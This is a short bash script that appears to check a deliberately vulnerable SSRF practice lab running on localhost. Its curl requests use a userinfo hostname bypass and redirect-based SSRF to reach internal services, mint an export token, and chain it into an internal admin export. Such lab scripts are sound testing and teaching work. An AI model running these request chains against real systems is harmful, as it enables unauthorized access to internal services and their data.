#!/usr/bin/env bash
set -euo pipefail

BASE="${BASE:-http://localhost:18080}"

cleanup() {
  rm -f /tmp/dojo_mint.json /tmp/dojo_export.json
}
trap cleanup EXIT

echo "[*] Health check"
curl -s "$BASE/health" | jq .

echo
echo "[*] Confirm direct internal hostname is blocked but userinfo bypass works"
echo "direct:"
curl -s "$BASE/fetch?url=http://internal-admin:5001/health" | jq .
echo "userinfo bypass:"
curl -s "$BASE/fetch?url=http://gateway@internal-admin:5001/health" | jq .

echo
echo "[*] Confirm redirect-based SSRF can reach internal health"
curl -s "$BASE/fetch?url=http://redirector:5002/to-admin-health" | jq .

echo
echo "[*] Confirm token-service discovery is reachable"
curl -s "$BASE/fetch?url=http://token-service:5003/.well-known/mesh" | jq .

echo
echo "[*] Confirm redirect-based SSRF can mint a legacy export token"
curl -s "$BASE/fetch?url=http://redirector:5002/to-token-mint" | tee /tmp/dojo_mint.json | jq .
TOKEN=$(python3 - <<'PY'
import json
with open('/tmp/dojo_mint.json','r',encoding='utf-8') as f:
    payload=json.load(f)
body=payload.get('body','{}')
try:
    nested=json.loads(body)
except Exception:
    nested={}
print(nested.get('access_token',''))
PY
)
if [ -z "$TOKEN" ]; then
  echo "[!] Failed to mint token from vulnerable baseline" >&2
  exit 1
fi

echo
echo "[*] Confirm token can be chained into internal export via legacy query-token path"
curl -s "$BASE/fetch?url=http://gateway@internal-admin:5001/admin/export?access_token=$TOKEN" | tee /tmp/dojo_export.json | jq .

echo
echo "[*] Confirm internal metrics breadcrumb is reachable through the same userinfo bypass"
curl -s "$BASE/fetch?url=http://gateway@internal-admin:5001/internal/metrics" | jq .
